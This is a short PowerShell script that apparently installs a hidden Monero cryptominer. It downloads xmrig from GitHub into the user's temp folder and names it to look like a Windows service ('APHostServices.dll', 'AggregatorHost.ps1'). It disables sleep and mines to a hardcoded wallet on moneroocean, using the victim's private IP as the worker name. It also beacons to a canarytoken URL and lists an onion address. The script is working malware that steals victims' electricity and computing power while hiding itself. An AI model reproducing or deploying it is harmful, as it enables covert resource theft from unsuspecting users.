<#
http://canarytokens.org/history?token=68oz5tvh7lo8yptld8gw0lrrf&auth=5c9e3abf90e021adf5a982bce9c43cea
gulf.moneroocean.stream:443 :: address with https
Worker name :: Private IP address ex: 10.0.0.76
http://mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion/ :: onion address
#>
#start PowerShell.exe -ExeCUtIonPoLiCy ByPaSs -FIlE "C:%homepath%\AppData\Local\Temp\AggregatorHost.ps1"
$canary="http://canarytokens.com/about/articles/images/68oz5tvh7lo8yptld8gw0lrrf/post.jsp"
$localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1]

function run{
	./xmrig --donate-level 0 --title APHostServices.dll --donate-level 0 --randomx-no-numa --cpu-priority 0 -o gulf.moneroocean.stream:443 --tls -u 45yP52mp6Hb9v3TQNrMeihQAJjVVUGacdEidm7rCUSNB8dWuU9QV3amB87xGhoEWioQEMBmVEyXBF1j2Mb4M486gMS3fnqN+10128 -k -p $localIpAddress
}

Powercfg /Change monitor-timeout-ac 0; Powercfg /Change monitor-timeout-dc 0; Powercfg /Change standby-timeout-ac 0; Powercfg /Change standby-timeout-dc 0

$check = test-path "C:\Users\Tom\AppData\Local\Temp\APHostServices"
if ( $check -eq $true)
{
	cd $env:TEMP/APHostServices/xmrig-6.16.2
	run 
	}else {
		iwr -Uri $canary
		cd $env:TEMP
        iwr -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-gcc-win64.zip' -OutFile "APHostService.zip"
		Expand-Archive -F -LiteralPath APHostService.zip -DestinationPath APHostServices
		Remove-Item -Force 'APHostService.zip'
		cd "APHostServices/xmrig-6.16.2"
		run
}